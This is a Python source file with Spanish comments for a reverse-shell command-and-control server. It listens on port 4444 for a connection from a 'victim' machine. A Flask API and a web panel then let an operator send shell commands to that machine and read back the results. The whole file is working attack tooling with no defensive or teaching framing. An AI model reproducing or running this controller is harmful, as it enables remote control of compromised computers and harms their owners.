import socket
import threading
import time
import argparse
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS

# Flask App
app = Flask(__name__)
CORS(app)
status = False
victim_socket = None

# Función para manejar la comunicación entre dos sockets
def handle(command, victim_socket):
    global status
    try:
        timeout = 1
        victim_socket.settimeout(2)  # Tiempo máximo de espera: 2 segundos
        command = command + '\n'
        victim_socket.send(command.encode())

        try:
            data = victim_socket.recv(1024).decode('utf-8', 'ignore')
            if not data:
                data = 'Conexión finalizada por la víctima'
                status = False
                victim_socket.close()
        except socket.timeout:
            data = "Timeout: No se recibieron datos del cliente víctima en {} segundos.<br>".format(timeout)
    except Exception as e:
        data = f"Error en la comunicación: {e}<br>"

    # Reemplazar los saltos de línea con <br> para que se muestren correctamente en HTML
    data = data.replace("\n", "<br>")
    return data

# Función para configurar el servidor en el puerto de recepción
def receiver_port(host, port):
    global status, victim_socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    print(f"\033[32mEscuchando en {host}:{port}...\033[0m")

    victim_socket, client_address = server.accept()
    print(f"\033[33mConexión establecida con {client_address}\033[0m")
    status = True
    return victim_socket

# Función para verificar el estado cada 10 segundos
def socket_status():
    global status
    while True:
        if victim_socket:
            try:
                victim_socket.send(b'')
                data = victim_socket.recv(1024)
                if not data:
                    status = False
                    victim_socket.close()
                    print("\033[31mEl socket se ha desconectado.\033[0m")
            except socket.timeout:
                pass
        time.sleep(10)

# Flask API Endpoints
@app.route('/api/v1/victim/command', methods=['POST'])
def send_command_to_victim():
    if not status:
        return jsonify({"error": "Victima no conectada"}), 400

    data = request.json
    command = data.get('command')

    if not command:
        return jsonify({"error": "Comando no proporcionado"}), 400

    try:
        response = handle(command, victim_socket)
        return jsonify({"response": response}), 200
    except Exception as e:
        return jsonify({"error": f"Fallo al enviar comando: {e}"}), 500

@app.route('/api/v1/victim/status', methods=['GET'])
def get_victim_status():
    if status:
        msj = "Conectado"
    else:
        msj = "No conectado"
    return jsonify({"status": msj}), 200

@app.route('/')
def index():
    # Sirve la página principal desde la carpeta templates
    return render_template('panel.html')

# Configuración de argumentos y ejecución
def parse_arguments():
    parser = argparse.ArgumentParser(description="Servidor con API y sockets.")
    parser.add_argument('--host', type=str, default='0.0.0.0', help='Dirección IP del servidor (por defecto 0.0.0.0)')
    parser.add_argument('--port', type=int, default=4444, help='Puerto para la conexión de datos (por defecto 4444)')
    parser.add_argument('--flask_host', type=str, default='0.0.0.0', help='Dirección IP del servidor API Flask (por defecto 0.0.0.0)')
    parser.add_argument('--flask_port', type=int, default=8080, help='Puerto para la API Flask (por defecto 8000)')
    return parser.parse_args()

def run_flask_app():
    args = parse_arguments()
    app.run(host=args.flask_host, port=args.flask_port)

def main():
    global victim_socket
    args = parse_arguments()
    HOST = args.host
    PORT = args.port

    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.start()

    victim_socket = receiver_port(HOST, PORT)

    client_handler2 = threading.Thread(target=socket_status)
    client_handler2.start()

main()
